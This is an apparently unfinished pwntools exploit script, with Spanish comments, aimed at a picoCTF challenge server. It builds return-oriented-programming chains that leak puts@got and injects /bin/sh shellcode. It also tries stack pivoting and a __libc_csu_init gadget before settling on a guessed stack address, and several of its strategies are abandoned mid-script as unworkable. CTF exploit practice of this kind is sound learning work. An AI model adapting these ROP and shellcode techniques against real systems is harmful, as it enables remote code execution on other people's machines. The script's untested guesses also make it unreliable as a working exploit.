#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = 'shape-facility.picoctf.net'
PORT = 49954

# Gadgets
pop_rdi = 0x4014b3
leave_ret = 0x40140d
puts_plt = 0x4010a0
puts_got = 0x404018
vuln_addr = 0x401229

io = remote(HOST, PORT)

log.info("=== STACK PIVOTING + ROP CHAIN ===")

# Paso 1: Colocar ROP chain en entries[0].name + parte de .msg
# name permite 32 bytes de escritura aunque el campo es de 8 bytes
io.sendlineafter(b'Exit the app\n', b'1')

# Construir ROP chain completo para leak
rop_chain = flat([
    pop_rdi,        # pop rdi; ret
    puts_got,       # arg: puts@got
    puts_plt,       # call puts
    vuln_addr,      # return to vuln
])

# Padding + ROP chain
name_payload = b'A' * 8 + rop_chain  # 8 bytes padding + ROP
assert len(name_payload) <= 32

io.sendlineafter(b'name: \n', name_payload)

# Paso 2: Calcular dirección de entries[0]
# entries[0].name está en rbp-736 (aprox)
# Para BSS: podemos usar direcciones fijas ya que no hay PIE
# Mejor: usar dirección conocida en .bss

# Alternativamente, necesito la dirección del stack
# Sin leak, esto es complicado...

# NUEVA ESTRATEGIA: Usar el hecho de que entries[0].msg puede contener shellcode
io.sendlineafter(b'Exit the app\n', b'2')
io.sendlineafter(b'message to?\n', b'0')

# Colocar shellcode
shellcode = asm(shellcraft.sh())
io.sendlineafter(b'send them?\n', shellcode)

# Paso 3: Usar stack pivoting
# Idea: establecer saved_rbp a entries[0]+offset donde está nuestro ROP
# Problema: no conocemos la dirección del stack sin leak

log.error("Necesito repensar - stack pivoting requiere conocer direcciones")
io.close()

# ESTRATEGIA ALTERNATIVA: Usar .bss para ROP chain
io = remote(HOST, PORT)

log.info("=== ESTRATEGIA: Escribir ROP chain en .bss ===")

# .bss está en 0x404060 (fijo, no PIE)
bss_addr = 0x404060 + 0x100  # Usar zona segura de .bss

# Problema: ¿cómo escribo en .bss?
# No tengo primitiva de escritura arbitraria...

log.error("Necesito repensar completamente")
io.close()

# ESTRATEGIA FINAL: Usar csu_init gadget para múltiples pops
log.info("=== USANDO __libc_csu_init GADGET ===")

io = remote(HOST, PORT)

# __libc_csu_init contiene gadgets útiles
# 0x4014aa: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret

csu_gadget1 = 0x4014aa  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_gadget2 = 0x401490  # mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]

# Agregar entrada para tener algo
io.sendlineafter(b'Exit the app\n', b'1')
io.sendlineafter(b'name: \n', b'test')

# Feedback overflow con múltiples gadgets usando CSU
# Pero solo tengo 12 bytes después del padding...

log.error("CSU tampoco cabe en 12 bytes")
io.close()

# ÚLTIMA ESTRATEGIA: ROP chain simple, confiar en stack fijo o bruteforce
log.info("=== ESTRATEGIA SIMPLE: ROP en feedback overflow ===")

io = remote(HOST, PORT)

# Si el stack no tiene ASLR completo (común en CTFs)
# entries[0] estará en ubicación predecible

# Agregar entrada con nombre que contenga ROP
io.sendlineafter(b'Exit the app\n', b'1')

rop_in_name = flat([
    b'AAAA',          # padding 4 bytes
    pop_rdi,          # 8 bytes
    puts_got,         # 8 bytes  
    puts_plt,         # 8 bytes
    vuln_addr,        # 8 bytes (total 36, se trunca a 32)
])[:32]

io.sendlineafter(b'name: \n', rop_in_name)

# Dirección estimada de entries[0].name
# rbp típicamente ~0x7fffffffd xxx
# entries[0] en rbp-736 = rbp-0x2e0

# Probar dirección típica
stack_addr = 0x7fffffffd500  # Estimación

payload = b'X' * 8 + b'Y' * 4 + p64(stack_addr) + p64(pop_rdi)
assert len(payload) <= 32

io.sendlineafter(b'Exit the app\n', b'3')
io.sendlineafter(b'appreciate it: \n', payload)

try:
    response = io.recv(timeout=2)
    log.info(f"Response: {response}")
    io.interactive()
except:
    log.error("Falló")
    io.close()
